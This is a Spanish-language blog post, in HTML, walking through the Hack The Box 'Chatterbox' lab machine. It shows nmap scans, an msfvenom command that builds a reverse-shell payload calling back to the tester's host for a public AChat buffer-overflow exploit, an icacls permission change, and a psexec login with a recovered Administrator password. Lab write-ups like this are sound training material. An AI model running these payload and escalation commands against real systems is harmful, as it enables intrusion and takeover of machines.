@@ -1,0 +1,353 @@
+<!doctype html><html lang=es dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>Hack The Box - Chatterbox | Román Zuleta</title>
+<meta name=keywords content="AChat,Buffer Overflow,icacls">
+<meta name=description content="Write-up de la máquina Chatterbox de la plataforma hackthebox.eu">
+<meta name=author content="Román Zuleta">
+<link rel=canonical href=https://rzul.me/posts/htb-chatterbox/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://rzul.me/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://rzul.me/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://rzul.me/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://rzul.me/apple-touch-icon.png>
+<link rel=mask-icon href=https://rzul.me/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<link rel=alternate hreflang=es href=https://rzul.me/posts/htb-chatterbox/>
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript><meta property="og:title" content="Hack The Box - Chatterbox">
+<meta property="og:description" content="Write-up de la máquina Chatterbox de la plataforma hackthebox.eu">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://rzul.me/posts/htb-chatterbox/">
+<meta property="og:image" content="https://rzul.me/images/posts/htb-chatterbox/cover.jpg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2022-05-31T23:23:58-05:00">
+<meta property="article:modified_time" content="2022-05-31T23:23:58-05:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://rzul.me/images/posts/htb-chatterbox/cover.jpg">
+<meta name=twitter:title content="Hack The Box - Chatterbox">
+<meta name=twitter:description content="Write-up de la máquina Chatterbox de la plataforma hackthebox.eu">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://rzul.me/posts/"},{"@type":"ListItem","position":2,"name":"Hack The Box - Chatterbox","item":"https://rzul.me/posts/htb-chatterbox/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Chatterbox","name":"Hack The Box - Chatterbox","description":"Write-up de la máquina Chatterbox de la plataforma hackthebox.eu","keywords":["AChat","Buffer Overflow","icacls"],"articleBody":"Estadísticas    Característica Descripción     Nombre Chatterbox   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores lkys37en    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT Initiating Connect Scan at 13:36 Scanning 10.10.10.74 [65535 ports] Discovered open port 135/tcp on 10.10.10.74 Discovered open port 139/tcp on 10.10.10.74 Discovered open port 445/tcp on 10.10.10.74 Discovered open port 49152/tcp on 10.10.10.74 Discovered open port 49154/tcp on 10.10.10.74 Discovered open port 9256/tcp on 10.10.10.74 Discovered open port 49153/tcp on 10.10.10.74 Discovered open port 9255/tcp on 10.10.10.74 Discovered open port 49155/tcp on 10.10.10.74 Discovered open port 49157/tcp on 10.10.10.74 Discovered open port 49156/tcp on 10.10.10.74 Completed Connect Scan at 13:37, 29.11s elapsed (65535 total ports) Nmap scan report for 10.10.10.74 Host is up, received user-set (0.073s latency). Scanned at 2022-05-27 13:36:42 EDT for 29s Not shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 9255/tcp open mon syn-ack 9256/tcp open unknown syn-ack 49152/tcp open unknown syn-ack 49153/tcp open unknown syn-ack 49154/tcp open unknown syn-ack 49155/tcp open unknown syn-ack 49156/tcp open unknown syn-ack 49157/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds Escaneo específico └─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT Nmap scan report for 10.10.10.74 Host is up (0.074s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 9255/tcp open http AChat chat system httpd |_http-server-header: AChat |_http-title: Site doesn't have a title. 9256/tcp open achat AChat chat system 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s | smb2-time: | date: 2022-05-27T22:40:43 |_ start_date: 2022-05-27T22:34:47 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Chatterbox | NetBIOS computer name: CHATTERBOX\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-05-27T18:40:47-04:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds Enumeración Servicios achat - 9255, 9256 Manual Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró este repositorio en github de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura AChat 0.150 Beta 7 Windows 7/8/10 x86/x64. Por lo que directamente se probó el exploit.\nExplotación Buffer Overflow - RCE Pasos previos | Preparación Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python  scode.txt\nSustituyendo los valores correspondientes en el script del shellcode y host.\nEjecución Obteniendo acceso como el usuario alfred.\nPost Explotación Enumeración Posteriormente al ejecutar winPEAS, se identificaron dos rutas potenciales a probar:\n El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator. Existen credenciales AutoLogon visibles.  Escalación de privilegios alfred → nt authority system En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de icacls para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de root.txt.\nPor medio de icacls .\\root.txt /e /p alfred:f, tomando como referencia este post para verificar el uso del binario.\nEn el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como psexec se puede obtener una shell como NT AUTHORITY SYSTEM, probando las credenciales obtenidas anteriormente bajo la suposición de reutilización de contraseña.\nEjecutando impacket-psexec 'Administrator:Welcome1!@10.10.10.74'.\nReferencias  AChat expoit. Windows change access permissions from the command line.  ","wordCount":"769","inLanguage":"es","image":"https://rzul.me/images/posts/htb-chatterbox/cover.jpg","datePublished":"2022-05-31T23:23:58-05:00","dateModified":"2022-05-31T23:23:58-05:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rzul.me/posts/htb-chatterbox/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://rzul.me/favicon.ico"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://rzul.me/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+<ul class=lang-switch><li>|</li>
+<li>
+<a href=https://rzul.me/en/ title=English aria-label=English>En</a>
+</li>
+</ul>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://rzul.me/archives/ title=Archivo>
+<span>Archivo</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/categories/ title=Categorías>
+<span>Categorías</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/tags/ title=Etiquetas>
+<span>Etiquetas</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/search/ title="Buscar (Alt + /)" accesskey=/>
+<span>Buscar</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://rzul.me/>Inicio</a>&nbsp;»&nbsp;<a href=https://rzul.me/posts/>Posts</a></div>
+<h1 class=post-title>
+Hack The Box - Chatterbox
+</h1>
+<div class=post-description>
+Write-up de la máquina Chatterbox de la plataforma hackthebox.eu
+</div>
+<div class=post-meta><span title="2022-05-31 23:23:58 -0500 CDT">mayo 31, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Román Zuleta&nbsp;|&nbsp;<a href=https://github.com/srrequiem/SecNotes/tree/main/HTB/Boxes/Windows/2_Medium/Chatterbox rel="noopener noreferrer" target=_blank>Sugerir cambios</a>
+</div>
+</header>
+<figure class=entry-cover><img loading=lazy src=https://rzul.me/images/posts/htb-chatterbox/cover.jpg alt="Chatterbox cover">
+<p></p>
+</figure><div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Tabla de Contenidos</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#estad%c3%adsticas aria-label=Estadísticas>Estadísticas</a></li>
+<li>
+<a href=#reconocimiento aria-label=Reconocimiento>Reconocimiento</a><ul>
+<li>
+<a href=#escaneo-de-host aria-label="Escaneo de host">Escaneo de host</a><ul>
+<li>
+<a href=#escaneo-completo-de-puertos aria-label="Escaneo completo de puertos">Escaneo completo de puertos</a></li>
+<li>
+<a href=#escaneo-espec%c3%adfico aria-label="Escaneo específico">Escaneo específico</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#enumeraci%c3%b3n aria-label=Enumeración>Enumeración</a><ul>
+<li>
+<a href=#servicios aria-label=Servicios>Servicios</a><ul>
+<li>
+<a href=#achat---9255-9256 aria-label="achat - 9255, 9256">achat - 9255, 9256</a><ul>
+<li>
+<a href=#manual aria-label=Manual>Manual</a></li></ul>
+</li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#explotaci%c3%b3n aria-label=Explotación>Explotación</a><ul>
+<li>
+<a href=#buffer-overflow---rce aria-label="Buffer Overflow - RCE">Buffer Overflow - RCE</a><ul>
+<li>
+<a href=#pasos-previos--preparaci%c3%b3n aria-label="Pasos previos | Preparación">Pasos previos | Preparación</a></li>
+<li>
+<a href=#ejecuci%c3%b3n aria-label=Ejecución>Ejecución</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#post-explotaci%c3%b3n aria-label="Post Explotación">Post Explotación</a><ul>
+<li>
+<a href=#enumeraci%c3%b3n-1 aria-label=Enumeración>Enumeración</a></li>
+<li>
+<a href=#escalaci%c3%b3n-de-privilegios aria-label="Escalación de privilegios">Escalación de privilegios</a><ul>
+<li>
+<a href=#alfred-rarr-nt-authority-system aria-label="alfred → nt authority system">alfred → nt authority system</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#referencias aria-label=Referencias>Referencias</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=estadísticas>Estadísticas<a hidden class=anchor aria-hidden=true href=#estadísticas>#</a></h1>
+<table>
+<thead>
+<tr>
+<th>Característica</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nombre</td>
+<td><a href=https://www.hackthebox.com/home/machines/profile/123>Chatterbox</a></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td>Dificultad oficial</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Dificultad de comunidad</td>
+<td><img loading=lazy src=/images/posts/htb-chatterbox/difficulty.png alt=Dificultad>
+</td>
+</tr>
+<tr>
+<td>Puntos</td>
+<td>30</td>
+</tr>
+<tr>
+<td>Creadores</td>
+<td><a href=https://www.hackthebox.com/home/users/profile/709>lkys37en</a></td>
+</tr>
+</tbody>
+</table>
+<h1 id=reconocimiento>Reconocimiento<a hidden class=anchor aria-hidden=true href=#reconocimiento>#</a></h1>
+<h2 id=escaneo-de-host>Escaneo de host<a hidden class=anchor aria-hidden=true href=#escaneo-de-host>#</a></h2>
+<h3 id=escaneo-completo-de-puertos>Escaneo completo de puertos<a hidden class=anchor aria-hidden=true href=#escaneo-completo-de-puertos>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
+Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-05-27 13:36 EDT
+Initiating Connect Scan at 13:36
+Scanning 10.10.10.74 <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
+Discovered open port 135/tcp on 10.10.10.74
+Discovered open port 139/tcp on 10.10.10.74
+Discovered open port 445/tcp on 10.10.10.74
+Discovered open port 49152/tcp on 10.10.10.74
+Discovered open port 49154/tcp on 10.10.10.74
+Discovered open port 9256/tcp on 10.10.10.74
+Discovered open port 49153/tcp on 10.10.10.74
+Discovered open port 9255/tcp on 10.10.10.74
+Discovered open port 49155/tcp on 10.10.10.74
+Discovered open port 49157/tcp on 10.10.10.74
+Discovered open port 49156/tcp on 10.10.10.74
+Completed Connect Scan at 13:37, 29.11s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.74
+Host is up, received user-set <span style=color:#f92672>(</span>0.073s latency<span style=color:#f92672>)</span>.
+Scanned at 2022-05-27 13:36:42 EDT <span style=color:#66d9ef>for</span> 29s
+Not shown: <span style=color:#ae81ff>54223</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>, <span style=color:#ae81ff>11301</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+9255/tcp  open  mon          syn-ack
+9256/tcp  open  unknown      syn-ack
+49152/tcp open  unknown      syn-ack
+49153/tcp open  unknown      syn-ack
+49154/tcp open  unknown      syn-ack
+49155/tcp open  unknown      syn-ack
+49156/tcp open  unknown      syn-ack
+49157/tcp open  unknown      syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 29.15 seconds
+</code></pre></div><h3 id=escaneo-específico>Escaneo específico<a hidden class=anchor aria-hidden=true href=#escaneo-específico>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-05-27 13:39 EDT
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.74
+Host is up <span style=color:#f92672>(</span>0.074s latency<span style=color:#f92672>)</span>.
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
+9255/tcp  open  http         AChat chat system httpd
+|_http-server-header: AChat
+|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title.
+9256/tcp  open  achat        AChat chat system
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
+| smb2-time:
+|   date: 2022-05-27T22:40:43
+|_  start_date: 2022-05-27T22:34:47
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled but not required
+| smb-os-discovery:
+|   OS: Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>Windows <span style=color:#ae81ff>7</span> Professional 6.1<span style=color:#f92672>)</span>
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Chatterbox
+|   NetBIOS computer name: CHATTERBOX<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
+|   Workgroup: WORKGROUP<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
+|_  System time: 2022-05-27T18:40:47-04:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 70.63 seconds
+</code></pre></div><h1 id=enumeración>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración>#</a></h1>
+<h2 id=servicios>Servicios<a hidden class=anchor aria-hidden=true href=#servicios>#</a></h2>
+<h3 id=achat---9255-9256>achat - 9255, 9256<a hidden class=anchor aria-hidden=true href=#achat---9255-9256>#</a></h3>
+<h4 id=manual>Manual<a hidden class=anchor aria-hidden=true href=#manual>#</a></h4>
+<p>Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró <a href=https://github.com/mpgn/AChat-Reverse-TCP-Exploit>este repositorio en github</a> de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura <code>AChat 0.150 Beta 7 Windows 7/8/10 x86/x64</code>. Por lo que directamente se probó el exploit.</p>
+<h1 id=explotación>Explotación<a hidden class=anchor aria-hidden=true href=#explotación>#</a></h1>
+<h2 id=buffer-overflow---rce>Buffer Overflow - RCE<a hidden class=anchor aria-hidden=true href=#buffer-overflow---rce>#</a></h2>
+<h3 id=pasos-previos--preparación>Pasos previos | Preparación<a hidden class=anchor aria-hidden=true href=#pasos-previos--preparación>#</a></h3>
+<p>Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando <code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > scode.txt</code></p>
+<p>Sustituyendo los valores correspondientes en el script del shellcode y host.</p>
+<h3 id=ejecución>Ejecución<a hidden class=anchor aria-hidden=true href=#ejecución>#</a></h3>
+<p>Obteniendo acceso como el usuario <code>alfred</code>.</p>
+<p><img loading=lazy src=/images/posts/htb-chatterbox/exploit_1.png alt="Acceso como usuario alfred">
+</p>
+<h1 id=post-explotación>Post Explotación<a hidden class=anchor aria-hidden=true href=#post-explotación>#</a></h1>
+<h2 id=enumeración-1>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración-1>#</a></h2>
+<p>Posteriormente al ejecutar <a href=https://github.com/carlospolop/PEASS-ng>winPEAS</a>, se identificaron dos rutas potenciales a probar:</p>
+<ol>
+<li>El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator.</li>
+<li>Existen credenciales AutoLogon visibles.</li>
+</ol>
+<p><img loading=lazy src=/images/posts/htb-chatterbox/post_1.png alt="Rutas potenciales">
+</p>
+<h2 id=escalación-de-privilegios>Escalación de privilegios<a hidden class=anchor aria-hidden=true href=#escalación-de-privilegios>#</a></h2>
+<h3 id=alfred-rarr-nt-authority-system>alfred → nt authority system<a hidden class=anchor aria-hidden=true href=#alfred-rarr-nt-authority-system>#</a></h3>
+<p>En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de <code>icacls</code> para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de <code>root.txt</code>.</p>
+<p>Por medio de <code>icacls .\root.txt /e /p alfred:f</code>, tomando como referencia <a href=https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html>este post</a> para verificar el uso del binario.</p>
+<p><img loading=lazy src=/images/posts/htb-chatterbox/post_2.png alt="Cambio de permisos">
+</p>
+<p>En el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como <code>psexec</code> se puede obtener una shell como <code>NT AUTHORITY SYSTEM</code>, probando las credenciales obtenidas anteriormente bajo la suposición de reutilización de contraseña.</p>
+<p>Ejecutando <code>impacket-psexec 'Administrator:Welcome1!@10.10.10.74'</code>.</p>
+<p><img loading=lazy src=/images/posts/htb-chatterbox/post_3.png alt="Acceso como nt authority system">
+</p>
+<h1 id=referencias>Referencias<a hidden class=anchor aria-hidden=true href=#referencias>#</a></h1>
+<ul>
+<li><a href=https://github.com/mpgn/AChat-Reverse-TCP-Exploit>AChat expoit</a>.</li>
+<li><a href=https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html>Windows change access permissions from the command line</a>.</li>
+</ul>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://rzul.me/tags/achat/>AChat</a></li>
+<li><a href=https://rzul.me/tags/buffer-overflow/>Buffer Overflow</a></li>
+<li><a href=https://rzul.me/tags/icacls/>icacls</a></li>
+</ul>
+<nav class=paginav>
+<a class=next href=https://rzul.me/posts/htb-silo/>
+<span class=title>Siguiente »</span>
+<br>
+<span>Hack The Box - Silo</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Chatterbox on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Chatterbox&url=https%3a%2f%2frzul.me%2fposts%2fhtb-chatterbox%2f&hashtags=AChat%2cBufferOverflow%2cicacls"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
